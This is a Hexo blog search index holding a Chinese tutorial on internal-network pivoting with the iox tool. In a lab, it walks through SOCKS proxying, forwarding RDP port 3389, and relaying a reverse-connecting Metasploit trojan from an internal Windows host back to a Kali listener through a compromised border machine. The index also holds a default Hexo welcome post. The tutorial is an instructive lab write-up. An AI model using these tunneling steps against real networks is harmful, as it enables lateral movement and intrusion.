<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网渗透 | iox端口转发&amp;代理工具</title>
      <link href="/2022/07/18/nei-wang-shen-tou-iox-duan-kou-zhuan-fa-dai-li-gong-ju/"/>
      <url>/2022/07/18/nei-wang-shen-tou-iox-duan-kou-zhuan-fa-dai-li-gong-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透-iox端口转发-amp-代理工具"><a href="#内网渗透-iox端口转发-amp-代理工具" class="headerlink" title="内网渗透 | iox端口转发&amp;代理工具"></a>内网渗透 | iox端口转发&amp;代理工具</h1><h2 id="0x00-iox介绍"><a href="#0x00-iox介绍" class="headerlink" title="0x00 iox介绍"></a>0x00 iox介绍</h2><h3 id="What’s-iox？"><a href="#What’s-iox？" class="headerlink" title="What’s iox？"></a>What’s iox？</h3><p>iox是一款Go语言编写的开源端口转发&amp;内网代理工具。虽然是两年前的了，但是我用着还是很舒服。</p><p>项目地址：<a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><h3 id="Why-iox？"><a href="#Why-iox？" class="headerlink" title="Why iox？"></a>Why iox？</h3><p>1、它可以说是ew、lcx的升级版，可以实现流量转发，端口转发、socks隧道、udp流量转发、<strong>流量加密</strong>等功能。</p><p>2、小巧、简便、无需繁琐的配置，命令逻辑也十分清晰，我是十分地喜欢。</p><p>3、frp和nps需要调整配置文件、ew需要输入很复杂的命令…iox命令十分简单。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>1、经典的ABC网络，A为外网，B为边界机区域，C为内网机器(不出网)</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626223415237.png"></p><p>2、假设我们攻下了边界机ubuntu，msf生成一个木马，让其上线</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626224655769.png"></p><p>3、下载<code>iox</code></p><p><a href="https://github.com/EddieIvan01/iox/releases/tag/v0.4">https://github.com/EddieIvan01/iox/releases/tag/v0.4</a></p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626224958180.png"></p><h2 id="0x02-iox-proxy模式"><a href="#0x02-iox-proxy模式" class="headerlink" title="0x02 iox proxy模式"></a>0x02 iox proxy模式</h2><p>iox的用法是统一的，<code>-l/--local</code>意为监听本地端口；<code>-r/--remote</code>意为连接远端主机。先来试试proxy模式。</p><p>1、通过msf上传<code>iox</code>文件至边界机<code>ubuntu</code>，并添加执行权限</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626225235589.png"></p><p>2、kali使用<code>iox proxy模式</code>开启监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./iox proxy -l <span class="token number">9999</span> -l <span class="token number">1080</span><span class="token comment">#注意两个端口顺序不要错</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626225438604.png"></p><p>3、边界机器ubuntu使用iox回连</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./iox proxy -r kali_ip:9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626230034457.png"></p><p>4、随后配置<code>proxychains.conf</code>文件</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626230130436.png"></p><p>5、成功访问内网centos机器的apache服务</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626230230764.png"></p><h2 id="0x03-iox-fwd模式"><a href="#0x03-iox-fwd模式" class="headerlink" title="0x03 iox fwd模式"></a>0x03 iox fwd模式</h2><h3 id="内网3389转发到kali"><a href="#内网3389转发到kali" class="headerlink" title="内网3389转发到kali"></a>内网3389转发到kali</h3><p>思路是一样的，将内网目标机器的3389转发到kali的3389，随后kali上再将3389的流量转到别的端口上，如33890。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">边界机上执行：./iox fwd -r <span class="token operator">&lt;</span>windows0<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:3389 -r <span class="token operator">&lt;</span>kali_ip<span class="token operator">&gt;</span>:9999kali上执行：./iox fwd -l <span class="token number">3389</span> -l <span class="token number">33890</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626232107746.png"></p><h3 id="内网机器反向回连"><a href="#内网机器反向回连" class="headerlink" title="内网机器反向回连"></a>内网机器反向回连</h3><p>目标windows2008是内网的一台机器，不能反向链接kali，通常情况下我们的套路是：挂路由传正向马上线</p><p>这次我们试试反向的，首先要知道，内网windows2008机器不能直接反连kali。但是C能直连B，B又能直连A。</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626235627849.png"></p><p>但是可以反连边界机ubuntu，所以我们先生成一个回连ubuntu4444端口的木马。</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626235826079.png"></p><p>也就是说完成了下图蓝色箭头这一步</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220626235950083.png"></p><p>随后既然边界机能够回连<code>kali</code>，那么我们就可以通过<code>ubuntu</code>上面的<code>iox</code>将4444端口获取的流量，转发给<code>kali</code>的<code>5555</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./iox fwd -l <span class="token number">4444</span> -r <span class="token number">192.168</span>.31.84:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220627001449877.png"></p><p>即完成了下图这一步</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220627000635837.png"></p><p>接下来<code>kali</code>开启<code>msf</code>监听<code>5555</code>，上传木马至边界机，内网<code>windows08</code>下载木马运行即可回连</p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220627001724671.png"></p><h2 id="0x04-启用加密"><a href="#0x04-启用加密" class="headerlink" title="0x04 启用加密"></a>0x04 启用加密</h2><h3 id="fwd模式加密"><a href="#fwd模式加密" class="headerlink" title="fwd模式加密"></a>fwd模式加密</h3><p>我们还是把内网<code>windows08</code>的<code>3389</code>端口转发到边界机，只不过这次是加密了。</p><p><code>-r</code>和<code>-l</code>参数需要在目标地址前加一个<code>*</code>来表示加密。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">边界ubuntu执行：./iox fwd -r <span class="token operator">&lt;</span>win0<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:3389 -r *<span class="token operator">&lt;</span>kali<span class="token operator">&gt;</span>:8888 -k <span class="token number">656565</span>kali执行：./iox fwd -l *8888 -l <span class="token number">33890</span> -k <span class="token number">656565</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220627003459347.png"></p><h3 id="proxy模式加密"><a href="#proxy模式加密" class="headerlink" title="proxy模式加密"></a>proxy模式加密</h3><p>同理，这里贴一下命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./iox proxy -l *9999 -k 000102./iox fwd -l <span class="token number">1080</span> -r *<span class="token operator">&lt;</span>kali<span class="token operator">&gt;</span>:9999 -k 000102<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x05-UDP流量转发"><a href="#0x05-UDP流量转发" class="headerlink" title="0x05 UDP流量转发"></a>0x05 UDP流量转发</h2><p>既然是<code>UDP</code>流量转发，那么<code>proxy</code>代理模式就肯定用不了，因为proxy默认走的<code>socks5</code></p><p><img src="https://test-1307853997.cos.ap-nanjing.myqcloud.com/image-20220627004446346.png"></p><p>很简单，在命令后面加个<code>-u</code>参数即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./iox fwd -l <span class="token number">53</span> -r *127.0.0.1:8888 -k 000102 -u./iox fwd -l *8888 -l *9999 -k 000102 -u./iox fwd -r *127.0.0.1:9999 -r <span class="token number">8.8</span>.8.8:53 -k 000102 -u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用的不是很多，了解一下即可。主要还是前面的<code>fwd</code>端口转发和<code>proxy</code>隧道代理功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/17/hello-world/"/>
      <url>/2022/07/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
